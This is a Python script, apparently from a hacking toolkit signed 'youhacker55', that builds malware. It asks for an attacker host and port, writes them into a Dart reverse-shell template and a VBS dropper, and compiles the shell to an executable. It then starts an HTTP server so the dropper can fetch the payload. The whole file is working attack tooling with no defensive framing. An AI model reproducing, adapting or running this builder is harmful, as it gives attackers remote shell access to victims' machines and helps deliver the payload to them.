import base64
import os
import platform
import subprocess
import time

print("""
8888888b.  d8b         888                    888    888                   888      
888  "Y88b Y8P         888                    888    888                   888      
888    888             888                    888    888                   888      
888    888 888 888d888 888888 888  888        8888888888  8888b.   .d8888b 888  888 
888    888 888 888P"   888    888  888        888    888     "88b d88P"    888 .88P 
888    888 888 888     888    888  888 888888 888    888 .d888888 888      888888K  
888  .d88P 888 888     Y88b.  Y88b 888        888    888 888  888 Y88b.    888 "88b 
8888888P"  888 888      "Y888  "Y88888        888    888 "Y888888  "Y8888P 888  888 
                                   888                                              
                              Y8b d88P                                              
                               "Y88P"                                               
By youhacker55
""")
def replace_string(filename, old_string, new_string):
    with open(filename) as f:
        s = f.read()
        if old_string not in s:
            return

    with open(filename, 'w') as f:
        s = s.replace(old_string, new_string)
        f.write(s)

def is_dart():
    isinstalled = False
    cmd = "where" if platform.system() == "Windows" else "which"
    try:
        subprocess.call([cmd, "dart"],stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT)

    except:
        isinstalled = False
    else:
        isinstalled = True
    return  isinstalled

if is_dart() == False:
    print("[-] Dart Not Installed")
else:
    print("[+] Dart Installed")
    lhsot = input("Lhost:")
    lport = input("lport:")
    os.system("powershell -c cp scripts/reverseshell.dart reverseshell.dart")
    os.system("powershell -c cp scripts/Dropper.vbs Dropper.vbs")
    replace_string("reverseshell.dart","$lhost",lhsot)
    replace_string("reverseshell.dart","$port",lport)
    replace_string("Dropper.vbs","$ip",lhsot)
    print("[+] Compiling")
    os.system("dart compile exe reverseshell.dart")
    print("Run Dropper.vbs on your system")
    print("[+] Starting HTTP server")
    os.system("py -3 -m http.server 8080")





